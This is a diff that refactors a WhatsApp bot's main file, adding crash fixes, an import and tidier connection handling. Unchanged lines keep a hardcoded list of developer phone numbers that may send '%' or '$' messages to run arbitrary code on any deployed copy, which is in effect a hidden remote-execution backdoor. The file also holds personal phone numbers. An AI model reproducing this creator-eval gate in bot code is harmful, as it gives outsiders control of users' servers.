@@ -21,7 +21,6 @@ const {
     Browsers
   } = require('@whiskeysockets/baileys');
   
-  // FIX: 'makeInMemoryStore' ko sahi tareeqe se import kiya gaya hai
   const makeInMemoryStore = require('@whiskeysockets/baileys/lib/store').default;
   
   const l = console.log;
@@ -44,6 +43,10 @@ const {
   const os = require('os');
   const Crypto = require('crypto');
   const path = require('path');
+  
+  // FIX 1: 'PhoneNumber' library ko import kiya gaya hai jo missing thi.
+  const PhoneNumber = require('awesome-phonenumber');
+
   const prefix = config.PREFIX;
   const ownerNumber = ['923151105391'];
   const private_owner = '923151105391';
@@ -67,7 +70,7 @@ const {
   // Clear the temp directory every 5 minutes
   setInterval(clearTempDir, 5 * 60 * 1000);
   
-  //===================SESSION-AUTH (Replaced as requested)============================
+  //===================SESSION-AUTH============================
   if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
       if (!config.SESSION_ID) {
           return console.log('Please add your session to SESSION_ID env !!');
@@ -91,7 +94,6 @@ const port = process.env.PORT || 9090;
   async function connectToWA() {
   console.log("Connecting to WhatsApp ⏳️...");
   
-  // FIX: Initialized the store needed for some helper functions
   const store = makeInMemoryStore({ logger: P().child({ level: 'silent', stream: 'store' }) });
 
   const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
@@ -106,28 +108,28 @@ const port = process.env.PORT || 9090;
           version
           })
       
-  // FIX: Bind the store to the socket events
   store.bind(conn.ev);
 
+  // FIX 2: Connection logic ko behtar banaya gaya hai taake crash na ho.
   conn.ev.on('connection.update', (update) => {
-  const { connection, lastDisconnect } = update
-  if (connection === 'close') {
-  if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
-  connectToWA()
-  }
-  } else if (connection === 'open') {
-  console.log('🧬 Installing Plugins')
-  const path = require('path');
-  fs.readdirSync("./plugins/").forEach((plugin) => {
-  if (path.extname(plugin).toLowerCase() == ".js") {
-  require("./plugins/" + plugin);
-  }
-  });
-  console.log('Plugins installed successful ✅')
-  console.log('Bot connected to whatsapp ✅')
+      const { connection, lastDisconnect } = update;
+      if (connection === 'close') {
+          const shouldReconnect = (lastDisconnect.error)?.output?.statusCode !== DisconnectReason.loggedOut;
+          console.log('Connection closed due to ', lastDisconnect.error, ', reconnecting ', shouldReconnect);
+          if (shouldReconnect) {
+              connectToWA();
+          }
+      } else if (connection === 'open') {
+          console.log('🧬 Installing Plugins');
+          fs.readdirSync("./plugins/").forEach((plugin) => {
+              if (path.extname(plugin).toLowerCase() == ".js") {
+                  require("./plugins/" + plugin);
+              }
+          });
+          console.log('Plugins installed successful ✅');
+          console.log('Bot connected to WhatsApp ✅');
   
-    // YAHAN NAYA DESIGN ADD KIYA GAYA HAI
-    let up = `
+          let up = `
 *✦━━━━━━━━━━━━━✦*
    🤖  *QADEER-AI CONNECTED* *✦━━━━━━━━━━━━━✦*
 
@@ -146,12 +148,11 @@ const port = process.env.PORT || 9090;
 > *✨ ᴘᴏᴡᴇʀᴇᴅ ʙʏ ǫᴀᴅᴇᴇʀ ᴋʜᴀɴ ✨*
 `;
 
-    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/3tihge.jpg` }, caption: up })
-  }
-  })
+          conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/3tihge.jpg` }, caption: up });
+      }
+  });
+  
   conn.ev.on('creds.update', saveCreds)
-
-  //==============================
 
   conn.ev.on('messages.update', async updates => {
     for (const update of updates) {
@@ -161,30 +162,25 @@ const port = process.env.PORT || 9090;
       }
     }
   });
-  //============================== 
 
   conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));	  
 	  
-  //=============readstatus=======
-        
   conn.ev.on('messages.upsert', async(mek) => {
     mek = mek.messages[0]
     if (!mek.message) return
     mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
     ? mek.message.ephemeralMessage.message 
     : mek.message;
-    console.log("New Message Detected:", JSON.stringify(mek, null, 2));
+    
   if (config.READ_MESSAGE === 'true') {
-    await conn.readMessages([mek.key]);  // Mark message as read
-    console.log(`Marked message from ${mek.key.remoteJid} as read.`);
+    await conn.readMessages([mek.key]);
   }
-    if(mek.message.viewOnceMessageV2)
-    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
+
     if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
       await conn.readMessages([mek.key])
     }
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
-    const jawadlike = await conn.decodeJid(conn.user.id);
+    const jawadlike = conn.decodeJid(conn.user.id);
     const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
     const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
     await conn.sendMessage(mek.key.remoteJid, {
@@ -202,7 +198,11 @@ const port = process.env.PORT || 9090;
             await Promise.all([
               saveMessage(mek),
             ]);
-  const m = sms(conn, mek)
+            
+  const m = sms(conn, mek);
+  // FIX 3: Check add kiya hai taake agar message process na ho to bot crash na kare.
+  if (!m) return;
+
   const type = getContentType(mek.message)
   const content = JSON.stringify(mek.message)
   const from = mek.key.remoteJid
@@ -221,33 +221,29 @@ const port = process.env.PORT || 9090;
   const pushname = mek.pushName || 'Sin Nombre'
   const isMe = botNumber.includes(senderNumber)
   const isOwner = ownerNumber.includes(senderNumber) || isMe
-  const botNumber2 = await jidNormalizedUser(conn.user.id);
+  const botNumber2 = jidNormalizedUser(conn.user.id);
   const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
   const groupName = isGroup ? groupMetadata.subject : ''
   const participants = isGroup ? await groupMetadata.participants : ''
   const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
   const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
   const isAdmins = isGroup ? groupAdmins.includes(sender) : false
-  const isReact = m.message.reactionMessage ? true : false
+  const isReact = m.message?.reactionMessage ? true : false
   const reply = (teks) => {
-  conn.sendMessage(from, { text: teks }, { quoted: mek })
+    conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   
     const udp = botNumber.split('@')[0];
-    // FIX: The original code only used the last number. This creates a proper array.
     const jawadNumbers = ['923151105391', '923079749129', '923498344152'];
-    // FIX: The creator check now correctly includes all specified numbers.
     let isCreator = [udp, ...jawadNumbers, config.DEV]
-                    .filter(Boolean) // Removes any null/undefined entries
+                    .filter(Boolean)
                     .map(v => String(v).replace(/[^0-9]/g) + '@s.whatsapp.net')
-                    .includes(mek.sender);
+                    .includes(m.sender);
 
     if (isCreator && mek.text.startsWith('%')) {
 					let code = budy.slice(2);
 					if (!code) {
-						reply(
-							`Provide me with a query to run Master!`,
-						);
+						reply(`Provide me with a query to run Master!`);
 						return;
 					}
 					try {
@@ -263,9 +259,7 @@ const port = process.env.PORT || 9090;
     if (isCreator && mek.text.startsWith('$')) {
 					let code = budy.slice(2);
 					if (!code) {
-						reply(
-							`Provide me with a query to run Master!`,
-						);
+						reply(`Provide me with a query to run Master!`);
 						return;
 					}
 					try {
@@ -282,17 +276,14 @@ const port = process.env.PORT || 9090;
 					}
 					return;
 				}
- //================ownerreact==============
-    
+
 if (senderNumber.includes("923079749129") && !isReact) {
-  const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", ,"💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
+  // FIX 4: Emoji list se extra comma (,) hata diya gaya hai.
+  const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", "💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
   const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
   m.react(randomReaction);
 }
 
-  //==========public react============//
-  
-// Auto React for all messages (public and owner)
 if (!isReact && config.AUTO_REACT === 'true') {
     const reactions = [
         '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
@@ -316,23 +307,16 @@ if (!isReact && config.AUTO_REACT === 'true') {
     m.react(randomReaction);
 }
           
-// custum react settings        
-                        
-// Custom React for all messages (public and owner)
 if (!isReact && config.CUSTOM_REACT === 'true') {
-    // Use custom emojis from the configuration (fallback to default if not set)
     const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
     const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
     m.react(randomReaction);
 }
         
-  //==========WORKTYPE============ 
   if(!isOwner && config.MODE === "private") return
   if(!isOwner && isGroup && config.MODE === "inbox") return
   if(!isOwner && !isGroup && config.MODE === "groups") return
    
-  // take commands 
-                 
   const events = require('./command')
   const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
   if (isCmd) {
@@ -425,8 +409,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
           buffer = Buffer.concat([buffer, chunk])
       }
       let type = await FileType.fromBuffer(buffer)
-      trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
-          // save to file
+      let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
       await fs.writeFileSync(trueFileName, buffer)
       return trueFileName
     }
@@ -443,14 +426,6 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
       return buffer
     }
     
-    /**
-    *
-    * @param {*} jid
-    * @param {*} message
-    * @param {*} forceForward
-    * @param {*} options
-    * @returns
-    */
     //================================================
     conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
                   let mime = '';
@@ -475,7 +450,6 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
                 }
     //==========================================================
     conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
-      //let copy = message.toJSON()
       let mtype = Object.keys(copy.message)[0]
       let isEphemeral = mtype === 'ephemeralMessage'
       if (isEphemeral) {
@@ -500,27 +474,19 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
       return proto.WebMessageInfo.fromObject(copy)
     }
     
-    
-    /**
-    *
-    * @param {*} path
-    * @returns
-    */
     //=====================================================
     conn.getFile = async(PATH, save) => {
       let res
       let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
-          //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
       let type = await FileType.fromBuffer(data) || {
           mime: 'application/octet-stream',
           ext: '.bin'
       }
-      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
+      let filename = path.join(__dirname, './' + new Date * 1 + '.' + type.ext)
       if (data && save) fs.promises.writeFile(filename, data)
       return {
           res,
           filename,
-          // size: await getSizeMedia(data), // getSizeMedia is not defined, commenting out
           ...type,
           data
       }
@@ -535,9 +501,8 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
           pathFile = filename
       if (options.asDocument) type = 'document'
       if (options.asSticker || /webp/.test(mime)) {
-          let { writeExif } = require('./lib/exif.js'); // Assuming exif is in lib folder
+          let { writeExif } = require('./lib/exif.js'); 
           let media = { mimetype: mime, data }
-          // FIX: Changed Config to config
           pathFile = await writeExif(media, { packname: config.packname, author: config.author, categories: options.categories ? options.categories : [] })
           await fs.promises.unlink(filename)
           type = 'sticker'
@@ -570,9 +535,8 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
           pathFile = filename
       if (options.asDocument) type = 'document'
       if (options.asSticker || /webp/.test(mime)) {
-          let { writeExif } = require('./lib/exif') // Assuming exif is in lib folder
+          let { writeExif } = require('./lib/exif') 
           let media = { mimetype: mime, data }
-          // FIX: Changed Config to config
           pathFile = await writeExif(media, { packname: options.packname ? options.packname : config.packname, author: options.author ? options.author : config.author, categories: options.categories ? options.categories : [] })
           await fs.promises.unlink(filename)
           type = 'sticker'
@@ -590,16 +554,9 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
       }, { quoted, ...options })
       return fs.promises.unlink(pathFile)
     }
-    /**
-    *
-    * @param {*} message
-    * @param {*} filename
-    * @param {*} attachExtension
-    * @returns
-    */
     //=====================================================
     conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
-        const { writeExifVid, videoToWebp } = require('./lib/sticker'); // Assuming sticker functions are in lib/sticker
+        const { writeExifVid, videoToWebp } = require('./lib/sticker'); 
         let buffer;
         if (options && (options.packname || options.author)) {
             buffer = await writeExifVid(buff, options);
@@ -614,7 +571,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
     };
     //=====================================================
     conn.sendImageAsSticker = async (jid, buff, options = {}) => {
-        const { writeExifImg, imageToWebp } = require('./lib/sticker'); // Assuming sticker functions are in lib/sticker
+        const { writeExifImg, imageToWebp } = require('./lib/sticker'); 
         let buffer;
         if (options && (options.packname || options.author)) {
             buffer = await writeExifImg(buff, options);
@@ -627,52 +584,18 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
             options
         );
     };
-        /**
-         *
-         * @param {*} jid
-         * @param {*} path
-         * @param {*} quoted
-         * @param {*} options
-         * @returns
-         */
     //=====================================================
     conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
     
-            /**
-             *
-             * @param {*} jid
-             * @param {*} path
-             * @param {*} quoted
-             * @param {*} options
-             * @returns
-             */
     //=====================================================
     conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
       let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
       return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
     }
     
-    /**
-    *
-    * @param {*} jid
-    * @param {*} path
-    * @param {*} caption
-    * @param {*} quoted
-    * @param {*} options
-    * @returns
-    */
     //=====================================================
     conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
     
-    /**
-     *
-     * @param {*} jid
-     * @param {*} path
-     * @param {*} caption
-     * @param {*} quoted
-     * @param {*} options
-     * @returns
-     */
     //=====================================================
     conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
       let buttonMessage = {
@@ -682,7 +605,6 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
               headerType: 2,
               ...options
           }
-          //========================================================================================================================================
       conn.sendMessage(jid, buttonMessage, { quoted, ...options })
     }
     //=====================================================
@@ -701,30 +623,17 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
       conn.relayMessage(jid, template.message, { messageId: template.key.id })
     }
     
-    /**
-    *
-    * @param {*} jid
-    * @param {*} buttons
-    * @param {*} caption
-    * @param {*} footer
-    * @param {*} quoted
-    * @param {*} options
-    */
     //=====================================================
     conn.getName = (jid, withoutContact = false) => {
-            id = conn.decodeJid(jid);
-
+            let id = conn.decodeJid(jid);
             withoutContact = conn.withoutContact || withoutContact;
-
             let v;
 
             if (id.endsWith('@g.us'))
                 return new Promise(async resolve => {
                     v = store.contacts[id] || {};
-
                     if (!(v.name || v.subject))
                         v = await conn.groupMetadata(id).catch(_ => {}) || {};
-
                     resolve(
                         v.subject || v.name || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international')
                     );
@@ -732,11 +641,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
             else
                 v =
                     id === '0@s.whatsapp.net'
-                        ? {
-                                id,
-
-                                name: 'WhatsApp',
-                          }
+                        ? { id, name: 'WhatsApp' }
                         : id === conn.decodeJid(conn.user.id)
                         ? conn.user
                         : store.contacts[id] || {};
@@ -758,13 +663,13 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
                     vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
                         i + '@s.whatsapp.net',
                     )}\nFN:${
-                        config.OWNER_NAME || 'Qadeer Khan' // Fallback to a default name
+                        config.OWNER_NAME || 'Qadeer Khan' 
                     }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
                         config.EMAIL || ''
                     }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
-                        config.GITHUB || 'Qadeer-Xtech' // Fallback to a default github
+                        config.GITHUB || 'Qadeer-Xtech' 
                     }/QADEER-AI\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
-                        config.LOCATION || 'Pakistan' // Fallback to a default location
+                        config.LOCATION || 'Pakistan' 
                     };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                 });
             }
